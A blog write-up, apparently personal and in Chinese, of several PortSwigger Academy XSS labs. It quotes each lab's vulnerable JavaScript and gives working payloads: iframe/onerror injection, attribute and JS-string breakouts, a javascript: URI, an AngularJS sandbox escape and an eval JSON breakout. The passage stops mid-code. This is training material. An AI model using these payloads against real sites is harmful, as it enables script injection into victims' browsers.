<!doctype html><html class=scroll-smooth lang=en><head><meta charset=utf-8><link href=/css/style.css rel=stylesheet><link href=/line-awesome/css/line-awesome.min.css rel=stylesheet><script defer src=/js/main.js></script><title>Portswigger Web lab writeup: Cross-site scripting | Random thoughts here</title><body class="bg-white dark:bg-slate-900 transition ease-in-out"><section><div class="sticky top-0 bg-slate-100 dark:bg-slate-800"><div class="container mx-auto flex place-content-between py-16 lg:py-8 font-sans text-6xl lg:text-2xl text-slate-900 dark:text-slate-300"><div class=flex><a class="m-0 p-0 text-slate-900 hover:text-slate-700 dark:text-slate-300 dark:hover:text-slate-200" href=/blog/> /blog </a></div><div class="flex gap-4"><div class="hidden cursor-pointer" id=back-to-top><i class="las la-level-up-alt"></i></div><a href=/><i class="las la-home"></i></a><div class=cursor-pointer id=darkmode-toggle><div class="hidden dark:inline"><i class="las la-sun"></i></div><div class="inline dark:hidden"><i class="las la-moon"></i></div></div></div></div></div><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><script type=text/x-mathjax-config>
      MathJax.Hub.Config({
        tex2jax: {inlineMath: [['$','$']]}
      });
    </script><div class="container mb-16"><div class="mt-4 font-serif text-slate-600 dark:text-slate-500 text-4xl lg:text-base">2023-08-29</div><h1 class="w-full mt-4 mb-8 font-serif text-8xl lg:text-4xl text-slate-900 dark:text-slate-300">Portswigger Web lab writeup: Cross-site scripting</h1><div class="w-100 border-t mb-8 border-slate-300 dark:border-slate-700"></div><div class=prose-boring><p><em>前面还有几道以前做的 毕竟简单不是很有必要重新记录</em><h2 id=lab-dom-xss-in-jquery-selector-sink-using-a-hashchange-event>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/dom-based>DOM XSS</a> in jQuery selector sink using a hashchange event</h2><p>JQuery:<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#88c0d0>$</span><span>(window)</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>on</span><span>(</span><span style=color:#a3be8c>'hashchange'</span><span style=color:#eceff4>, </span><span style=color:#81a1c1>function</span><span>(){
</span><span>                            </span><span style=color:#81a1c1>var </span><span>post </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>$</span><span>(</span><span style=color:#a3be8c>'section.blog-list h2:contains(' </span><span style=color:#81a1c1>+ </span><span style=color:#88c0d0>decodeURIComponent</span><span>(window</span><span style=color:#81a1c1>.</span><span>location</span><span style=color:#81a1c1>.</span><span>hash</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>slice</span><span>(</span><span style=color:#b48ead>1</span><span>)) </span><span style=color:#81a1c1>+ </span><span style=color:#a3be8c>')'</span><span>)</span><span style=color:#eceff4>;
</span><span>                            </span><span style=color:#81a1c1>if </span><span>(post) post</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>get</span><span>(</span><span style=color:#b48ead>0</span><span>)</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>scrollIntoView</span><span>()</span><span style=color:#eceff4>;
</span><span>                        })</span><span style=color:#eceff4>;
</span></code></pre><p>当 URL 的片段标识符更改时，将触发<strong>hashchange</strong>事件，传递到 Jquery 选择器，选择到 h2 中 存在 <code>decodeURIComponent(window.location.hash.slice(1))</code> 的元素（自然是不存在）。然后<code>scrollIntoView()</code>使用户可见。<p>因而 payload 要触发 haschange 事件。<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTiframe </span><span style=color:#8fbcbb>src</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>"https://YOUR-LAB-ID.web-security-academy.net/#" </span><span style=color:#8fbcbb>onload</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>"</span><span style=color:#81a1c1>this.</span><span style=color:#eceff4>src</span><span style=color:#81a1c1>+=</span><span style=color:#a3be8c>'&LTimg src=x onerror=print()>'"</span><span style=color:#81a1c1>>&LT/iframe>
</span></code></pre><h2 id=lab-reflected-xss-into-attribute-with-angle-brackets-html-encoded>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/reflected>Reflected XSS</a> into attribute with angle brackets HTML-encoded</h2><p>属性注入。这个我熟<p>查阅 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#a3be8c>" autofocus onfocusin=alert(window.origin) b="
</span></code></pre><h2 id=lab-stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/stored>Stored XSS</a> into anchor <code>href</code> attribute with double quotes HTML-encoded</h2><p>要实现点击名字的时候alert，测试发现点击跳转到填入的website。js伪协议直接过<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#5e81ac>javascript</span><span style=color:#eceff4>:</span><span style=color:#88c0d0>alert</span><span>(window</span><span style=color:#81a1c1>.</span><span>origin)
</span></code></pre><p>也就是a.href的滥用<h2 id=lab-reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/reflected>Reflected XSS</a> into a JavaScript string with angle brackets HTML encoded</h2><pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span> </span><span style=color:#81a1c1>var </span><span>searchTerms </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>'search参数'</span><span style=color:#eceff4>;
</span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>write</span><span>(</span><span style=color:#a3be8c>'&LTimg src="/resources/images/tracker.gif?searchTerms='</span><span style=color:#81a1c1>+</span><span style=color:#88c0d0>encodeURIComponent</span><span>(searchTerms)</span><span style=color:#81a1c1>+</span><span style=color:#a3be8c>'">'</span><span>)</span><span style=color:#eceff4>;
</span></code></pre><p>JS的内容直接来源于参数，应该是做了啥模板渲染的。注入js代码<pre style=color:#d8dee9;background-color:#2e3440><code><span>%27;%0aalert(window.origin);%0ab='
</span></code></pre><h2 id=lab-dom-xss-in-document-write-sink-using-source-location-search-inside-a-select>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/dom-based>DOM XSS</a> in <code>document.write</code> sink using source <code>location.search</code> inside a select</h2><pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#81a1c1>var </span><span>stores </span><span style=color:#81a1c1>= </span><span>[</span><span style=color:#a3be8c>"London"</span><span style=color:#eceff4>,</span><span style=color:#a3be8c>"Paris"</span><span style=color:#eceff4>,</span><span style=color:#a3be8c>"Milan"</span><span>]</span><span style=color:#eceff4>;
</span><span style=color:#81a1c1>var </span><span>store </span><span style=color:#81a1c1>= </span><span>(</span><span style=color:#81a1c1>new </span><span style=color:#8fbcbb>URLSearchParams</span><span>(window</span><span style=color:#81a1c1>.</span><span>location</span><span style=color:#81a1c1>.</span><span>search))</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>get</span><span>(</span><span style=color:#a3be8c>'storeId'</span><span>)</span><span style=color:#eceff4>;
</span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>write</span><span>(</span><span style=color:#a3be8c>'&LTselect name="storeId">'</span><span>)</span><span style=color:#eceff4>;
</span><span style=color:#81a1c1>if</span><span>(store) {
</span><span>    document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>write</span><span>(</span><span style=color:#a3be8c>'&LToption selected>'</span><span style=color:#81a1c1>+</span><span>store</span><span style=color:#81a1c1>+</span><span style=color:#a3be8c>'&LT/option>'</span><span>)</span><span style=color:#eceff4>;
</span><span>}
</span><span style=color:#81a1c1>for</span><span>(</span><span style=color:#81a1c1>var </span><span>i</span><span style=color:#81a1c1>=</span><span style=color:#b48ead>0</span><span style=color:#eceff4>;</span><span>i</span><span style=color:#81a1c1><</span><span>stores</span><span style=color:#81a1c1>.</span><span>length</span><span style=color:#eceff4>;</span><span>i</span><span style=color:#81a1c1>++</span><span>) {
</span><span>    </span><span style=color:#81a1c1>if</span><span>(stores[i] </span><span style=color:#81a1c1>=== </span><span>store) {
</span><span>        </span><span style=color:#81a1c1>continue</span><span style=color:#eceff4>;
</span><span>    }
</span><span>    document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>write</span><span>(</span><span style=color:#a3be8c>'&LToption>'</span><span style=color:#81a1c1>+</span><span>stores[i]</span><span style=color:#81a1c1>+</span><span style=color:#a3be8c>'&LT/option>'</span><span>)</span><span style=color:#eceff4>;
</span><span>}
</span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>write</span><span>(</span><span style=color:#a3be8c>'&LT/select>'</span><span>)</span><span style=color:#eceff4>;
</span></code></pre><p>直接Inject<pre style=color:#d8dee9;background-color:#2e3440><code><span>/product?productId=1&storeId=&LTscript>alert(window.origin)&LT/script>
</span></code></pre><h2 id=lab-dom-xss-in-angularjs-expression-with-angle-brackets-and-double-quotes-html-encoded>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/dom-based>DOM XSS</a> in AngularJS expression with angle brackets and double quotes HTML-encoded</h2><p>url参数在<code>><</code>中间，尖括号转义。无法逃出<p>而由于AngularJS的引入，可以 CSTI<pre style=color:#d8dee9;background-color:#2e3440><code><span>{{$on.constructor('alert(window.origin)')()}}
</span></code></pre><p>另外 AngularJS gadget (SSTI)还可以用来 bypass CSP 。payload 收集：https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md 以及 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected<h2 id=lab-reflected-dom-xss>Lab: Reflected <a href=https://portswigger.net/web-security/cross-site-scripting/dom-based>DOM XSS</a></h2><pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#81a1c1>function </span><span style=color:#88c0d0>search</span><span>(path) {
</span><span>    </span><span style=color:#81a1c1>var </span><span>xhr </span><span style=color:#81a1c1>= new </span><span style=color:#8fbcbb>XMLHttpRequest</span><span>()</span><span style=color:#eceff4>;
</span><span>    xhr</span><span style=color:#81a1c1>.</span><span>onreadystatechange </span><span style=color:#81a1c1>= function</span><span>() {
</span><span>        </span><span style=color:#81a1c1>if </span><span>(</span><span style=color:#81a1c1>this.</span><span>readyState </span><span style=color:#81a1c1>== </span><span style=color:#b48ead>4 </span><span style=color:#81a1c1>&& this.</span><span>status </span><span style=color:#81a1c1>== </span><span style=color:#b48ead>200</span><span>) {
</span><span>            </span><span style=color:#88c0d0>eval</span><span>(</span><span style=color:#a3be8c>'var searchResultsObj = ' </span><span style=color:#81a1c1>+ this.</span><span>responseText)</span><span style=color:#eceff4>;
</span><span>            </span><span style=color:#88c0d0>displaySearchResults</span><span>(searchResultsObj)</span><span style=color:#eceff4>;
</span><span>        }
</span><span>    }</span><span style=color:#eceff4>;
</span><span>    xhr</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>open</span><span>(</span><span style=color:#a3be8c>"GET"</span><span style=color:#eceff4>, </span><span>path </span><span style=color:#81a1c1>+ </span><span>window</span><span style=color:#81a1c1>.</span><span>location</span><span style=color:#81a1c1>.</span><span>search)</span><span style=color:#eceff4>;
</span><span>    xhr</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>send</span><span>()</span><span style=color:#eceff4>;
</span><span>
</span><span>    </span><span style=color:#81a1c1>function </span><span style=color:#88c0d0>displaySearchResults</span><span>(searchResultsObj) {
</span><span>        </span><span style=color:#81a1c1>var </span><span>blogHeader </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>getElementsByClassName</span><span>(</span><span style=color:#a3be8c>"blog-header"</span><span>)[</span><span style=color:#b48ead>0</span><span>]</span><span style=color:#eceff4>;
</span><span>        </span><span style=color:#81a1c1>var </span><span>blogList </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>getElementsByClassName</span><span>(</span><span style=color:#a3be8c>"blog-list"</span><span>)[</span><span style=color:#b48ead>0</span><span>]</span><span style=color:#eceff4>;
</span><span>        </span><span style=color:#81a1c1>var </span><span>searchTerm </span><span style=color:#81a1c1>= </span><span>searchResultsObj</span><span style=color:#81a1c1>.</span><span>searchTerm
</span><span>        </span><span style=color:#81a1c1>var </span><span>searchResults </span><span style=color:#81a1c1>= </span><span>searchResultsObj</span><span style=color:#81a1c1>.</span><span>results
</span><span>
</span><span>        </span><span style=color:#81a1c1>var </span><span>h1 </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"h1"</span><span>)</span><span style=color:#eceff4>;
</span><span>        h1</span><span style=color:#81a1c1>.</span><span>innerText </span><span style=color:#81a1c1>= </span><span>searchResults</span><span style=color:#81a1c1>.</span><span>length </span><span style=color:#81a1c1>+ </span><span style=color:#a3be8c>" search results for '" </span><span style=color:#81a1c1>+ </span><span>searchTerm </span><span style=color:#81a1c1>+ </span><span style=color:#a3be8c>"'"</span><span style=color:#eceff4>;
</span><span>        blogHeader</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(h1)</span><span style=color:#eceff4>;
</span><span>        </span><span style=color:#81a1c1>var </span><span>hr </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"hr"</span><span>)</span><span style=color:#eceff4>;
</span><span>        blogHeader</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(hr)
</span><span>
</span><span>        </span><span style=color:#81a1c1>for </span><span>(</span><span style=color:#81a1c1>var </span><span>i </span><span style=color:#81a1c1>= </span><span style=color:#b48ead>0</span><span style=color:#eceff4>; </span><span>i </span><span style=color:#81a1c1>< </span><span>searchResults</span><span style=color:#81a1c1>.</span><span>length</span><span style=color:#eceff4>; </span><span style=color:#81a1c1>++</span><span>i)
</span><span>        {
</span><span>            </span><span style=color:#81a1c1>var </span><span>searchResult </span><span style=color:#81a1c1>= </span><span>searchResults[i]</span><span style=color:#eceff4>;
</span><span>            </span><span style=color:#81a1c1>if </span><span>(searchResult</span><span style=color:#81a1c1>.</span><span>id) {
</span><span>                </span><span style=color:#81a1c1>var </span><span>blogLink </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"a"</span><span>)</span><span style=color:#eceff4>;
</span><span>                blogLink</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>setAttribute</span><span>(</span><span style=color:#a3be8c>"href"</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"/post?postId=" </span><span style=color:#81a1c1>+ </span><span>searchResult</span><span style=color:#81a1c1>.</span><span>id)</span><span style=color:#eceff4>;
</span><span>
</span><span>                </span><span style=color:#81a1c1>if </span><span>(searchResult</span><span style=color:#81a1c1>.</span><span>headerImage) {
</span><span>                    </span><span style=color:#81a1c1>var </span><span>headerImage </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"img"</span><span>)</span><span style=color:#eceff4>;
</span><span>                    headerImage</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>setAttribute</span><span>(</span><span style=color:#a3be8c>"src"</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"/image/" </span><span style=color:#81a1c1>+ </span><span>searchResult</span><span style=color:#81a1c1>.</span><span>headerImage)</span><span style=color:#eceff4>;
</span><span>                    blogLink</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(headerImage)</span><span style=color:#eceff4>;
</span><span>                }
</span><span>
</span><span>                blogList</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(blogLink)</span><span style=color:#eceff4>;
</span><span>            }
</span><span>
</span><span>            blogList</span><span style=color:#81a1c1>.</span><span>innerHTML </span><span style=color:#81a1c1>+= </span><span style=color:#a3be8c>"&LTbr/>"</span><span style=color:#eceff4>;
</span><span>
</span><span>            </span><span style=color:#81a1c1>if </span><span>(searchResult</span><span style=color:#81a1c1>.</span><span>title) {
</span><span>                </span><span style=color:#81a1c1>var </span><span>title </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"h2"</span><span>)</span><span style=color:#eceff4>;
</span><span>                title</span><span style=color:#81a1c1>.</span><span>innerText </span><span style=color:#81a1c1>= </span><span>searchResult</span><span style=color:#81a1c1>.</span><span>title</span><span style=color:#eceff4>;
</span><span>                blogList</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(title)</span><span style=color:#eceff4>;
</span><span>            }
</span><span>
</span><span>            </span><span style=color:#81a1c1>if </span><span>(searchResult</span><span style=color:#81a1c1>.</span><span>summary) {
</span><span>                </span><span style=color:#81a1c1>var </span><span>summary </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"p"</span><span>)</span><span style=color:#eceff4>;
</span><span>                summary</span><span style=color:#81a1c1>.</span><span>innerText </span><span style=color:#81a1c1>= </span><span>searchResult</span><span style=color:#81a1c1>.</span><span>summary</span><span style=color:#eceff4>;
</span><span>                blogList</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(summary)</span><span style=color:#eceff4>;
</span><span>            }
</span><span>
</span><span>            </span><span style=color:#81a1c1>if </span><span>(searchResult</span><span style=color:#81a1c1>.</span><span>id) {
</span><span>                </span><span style=color:#81a1c1>var </span><span>viewPostButton </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"a"</span><span>)</span><span style=color:#eceff4>;
</span><span>                viewPostButton</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>setAttribute</span><span>(</span><span style=color:#a3be8c>"class"</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"button is-small"</span><span>)</span><span style=color:#eceff4>;
</span><span>                viewPostButton</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>setAttribute</span><span>(</span><span style=color:#a3be8c>"href"</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"/post?postId=" </span><span style=color:#81a1c1>+ </span><span>searchResult</span><span style=color:#81a1c1>.</span><span>id)</span><span style=color:#eceff4>;
</span><span>                viewPostButton</span><span style=color:#81a1c1>.</span><span>innerText </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>"View post"</span><span style=color:#eceff4>;
</span><span>            }
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#81a1c1>var </span><span>linkback </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"div"</span><span>)</span><span style=color:#eceff4>;
</span><span>        linkback</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>setAttribute</span><span>(</span><span style=color:#a3be8c>"class"</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"is-linkback"</span><span>)</span><span style=color:#eceff4>;
</span><span>        </span><span style=color:#81a1c1>var </span><span>backToBlog </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"a"</span><span>)</span><span style=color:#eceff4>;
</span><span>        backToBlog</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>setAttribute</span><span>(</span><span style=color:#a3be8c>"href"</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"/"</span><span>)</span><span style=color:#eceff4>;
</span><span>        backToBlog</span><span style=color:#81a1c1>.</span><span>innerText </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>"Back to Blog"</span><span style=color:#eceff4>;
</span><span>        linkback</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(backToBlog)</span><span style=color:#eceff4>;
</span><span>        blogList</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(linkback)</span><span style=color:#eceff4>;
</span><span>    }
</span><span>}
</span></code></pre><p>调用了<code>/search-results?search=123</code>的 api 做了一个 ajax (应该算是吧)。脚本中直接拼接 responseText eval了，如果 api 可以注入那就可以实现 alert。<p>测试发现 api 的转义策略有问题，输入<code>\"</code>返回就不是合法 json 了，escape 掉了一个引号<p>构造合法 json<pre style=color:#d8dee9;background-color:#2e3440><code><span>\"-alert(window.origin)}//
</span></code></pre><p>由于这个<code>-</code>仅仅是计算符号，改成<code>*</code>或<code>/</code>都行。而<code>+</code>因为会被 http 协议认作空格所以不能正常利用。改成<code>%2B</code>就可以了<pre style=color:#d8dee9;background-color:#2e3440><code><span>\"%2Balert()}//
</span></code></pre><h2 id=lab-stored-dom-xss>Lab: Stored <a href=https://portswigger.net/web-security/cross-site-scripting/dom-based>DOM XSS</a></h2><p>随便点一个文章<code>Ctrl + U</code>可以看到没有评论。可以判断为前端渲染<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#81a1c1>function </span><span style=color:#88c0d0>loadComments</span><span>(postCommentPath) {
</span><span>    </span><span style=color:#81a1c1>let </span><span>xhr </span><span style=color:#81a1c1>= new </span><span style=color:#8fbcbb>XMLHttpRequest</span><span>()</span><span style=color:#eceff4>;
</span><span>    xhr</span><span style=color:#81a1c1>.</span><span>onreadystatechange </span><span style=color:#81a1c1>= function</span><span>() {
</span><span>        </span><span style=color:#81a1c1>if </span><span>(</span><span style=color:#81a1c1>this.</span><span>readyState </span><span style=color:#81a1c1>== </span><span style=color:#b48ead>4 </span><span style=color:#81a1c1>&& this.</span><span>status </span><span style=color:#81a1c1>== </span><span style=color:#b48ead>200</span><span>) {
</span><span>            </span><span style=color:#81a1c1>let </span><span>comments </span><span style=color:#81a1c1>= </span><span style=color:#8fbcbb>JSON</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>parse</span><span>(</span><span style=color:#81a1c1>this.</span><span>responseText)</span><span style=color:#eceff4>;
</span><span>            </span><span style=color:#88c0d0>displayComments</span><span>(comments)</span><span style=color:#eceff4>;
</span><span>        }
</span><span>    }</span><span style=color:#eceff4>;
</span><span>    xhr</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>open</span><span>(</span><span style=color:#a3be8c>"GET"</span><span style=color:#eceff4>, </span><span>postCommentPath </span><span style=color:#81a1c1>+ </span><span>window</span><span style=color:#81a1c1>.</span><span>location</span><span style=color:#81a1c1>.</span><span>search)</span><span style=color:#eceff4>;
</span><span>    xhr</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>send</span><span>()</span><span style=color:#eceff4>;
</span><span>
</span><span>    </span><span style=color:#81a1c1>function </span><span style=color:#88c0d0>escapeHTML</span><span>(html) {
</span><span>        </span><span style=color:#81a1c1>return </span><span>html</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>replace</span><span>(</span><span style=color:#a3be8c>'<'</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>'&amplt;'</span><span>)</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>replace</span><span>(</span><span style=color:#a3be8c>'>'</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>'&ampgt;'</span><span>)</span><span style=color:#eceff4>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#81a1c1>function </span><span style=color:#88c0d0>displayComments</span><span>(comments) {
</span><span>        </span><span style=color:#81a1c1>let </span><span>userComments </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>getElementById</span><span>(</span><span style=color:#a3be8c>"user-comments"</span><span>)</span><span style=color:#eceff4>;
</span><span>
</span><span>        </span><span style=color:#81a1c1>for </span><span>(</span><span style=color:#81a1c1>let </span><span>i </span><span style=color:#81a1c1>= </span><span style=color:#b48ead>0</span><span style=color:#eceff4>; </span><span>i </span><span style=color:#81a1c1>< </span><span>comments</span><span style=color:#81a1c1>.</span><span>length</span><span style=color:#eceff4>; </span><span style=color:#81a1c1>++</span><span>i)
</span><span>        {
</span><span>            comment </span><span style=color:#81a1c1>= </span><span>comments[i]</span><span style=color:#eceff4>;
</span><span>            </span><span style=color:#81a1c1>let </span><span>commentSection </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"section"</span><span>)</span><span style=color:#eceff4>;
</span><span>            commentSection</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>setAttribute</span><span>(</span><span style=color:#a3be8c>"class"</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"comment"</span><span>)</span><span style=color:#eceff4>;
</span><span>
</span><span>            </span><span style=color:#81a1c1>let </span><span>firstPElement </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"p"</span><span>)</span><span style=color:#eceff4>;
</span><span>
</span><span>            </span><span style=color:#81a1c1>let </span><span>avatarImgElement </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"img"</span><span>)</span><span style=color:#eceff4>;
</span><span>            avatarImgElement</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>setAttribute</span><span>(</span><span style=color:#a3be8c>"class"</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"avatar"</span><span>)</span><span style=color:#eceff4>;
</span><span>            avatarImgElement</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>setAttribute</span><span>(</span><span style=color:#a3be8c>"src"</span><span style=color:#eceff4>, </span><span>comment</span><span style=color:#81a1c1>.</span><span>avatar </span><span style=color:#81a1c1>? </span><span style=color:#88c0d0>escapeHTML</span><span>(comment</span><span style=color:#81a1c1>.</span><span>avatar) </span><span style=color:#81a1c1>: </span><span style=color:#a3be8c>"/resources/images/avatarDefault.svg"</span><span>)</span><span style=color:#eceff4>;
</span><span>
</span><span>            </span><span style=color:#81a1c1>if </span><span>(comment</span><span style=color:#81a1c1>.</span><span>author) {
</span><span>                </span><span style=color:#81a1c1>if </span><span>(comment</span><span style=color:#81a1c1>.</span><span>website) {
</span><span>                    </span><span style=color:#81a1c1>let </span><span>websiteElement </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"a"</span><span>)</span><span style=color:#eceff4>;
</span><span>                    websiteElement</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>setAttribute</span><span>(</span><span style=color:#a3be8c>"id"</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"author"</span><span>)</span><span style=color:#eceff4>;
</span><span>                    websiteElement</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>setAttribute</span><span>(</span><span style=color:#a3be8c>"href"</span><span style=color:#eceff4>, </span><span>comment</span><span style=color:#81a1c1>.</span><span>website)</span><span style=color:#eceff4>;
</span><span>                    firstPElement</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(websiteElement)
</span><span>                }
</span><span>
</span><span>                </span><span style=color:#81a1c1>let </span><span>newInnerHtml </span><span style=color:#81a1c1>= </span><span>firstPElement</span><span style=color:#81a1c1>.</span><span>innerHTML </span><span style=color:#81a1c1>+ </span><span style=color:#88c0d0>escapeHTML</span><span>(comment</span><span style=color:#81a1c1>.</span><span>author)
</span><span>                firstPElement</span><span style=color:#81a1c1>.</span><span>innerHTML </span><span style=color:#81a1c1>= </span><span>newInnerHtml
</span><span>            }
</span><span>
</span><span>            </span><span style=color:#81a1c1>if </span><span>(comment</span><span style=color:#81a1c1>.</span><span>date) {
</span><span>                </span><span style=color:#81a1c1>let </span><span>dateObj </span><span style=color:#81a1c1>= new </span><span style=color:#8fbcbb>Date</span><span>(comment</span><span style=color:#81a1c1>.</span><span>date)
</span><span>                </span><span style=color:#81a1c1>let </span><span>month </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>'' </span><span style=color:#81a1c1>+ </span><span>(dateObj</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>getMonth</span><span>() </span><span style=color:#81a1c1>+ </span><span style=color:#b48ead>1</span><span>)</span><span style=color:#eceff4>;
</span><span>                </span><span style=color:#81a1c1>let </span><span>day </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>'' </span><span style=color:#81a1c1>+ </span><span>dateObj</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>getDate</span><span>()</span><span style=color:#eceff4>;
</span><span>                </span><span style=color:#81a1c1>let </span><span>year </span><span style=color:#81a1c1>= </span><span>dateObj</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>getFullYear</span><span>()</span><span style=color:#eceff4>;
</span><span>
</span><span>                </span><span style=color:#81a1c1>if </span><span>(month</span><span style=color:#81a1c1>.</span><span>length </span><span style=color:#81a1c1>< </span><span style=color:#b48ead>2</span><span>)
</span><span>                    month </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>'0' </span><span style=color:#81a1c1>+ </span><span>month</span><span style=color:#eceff4>;
</span><span>                </span><span style=color:#81a1c1>if </span><span>(day</span><span style=color:#81a1c1>.</span><span>length </span><span style=color:#81a1c1>< </span><span style=color:#b48ead>2</span><span>)
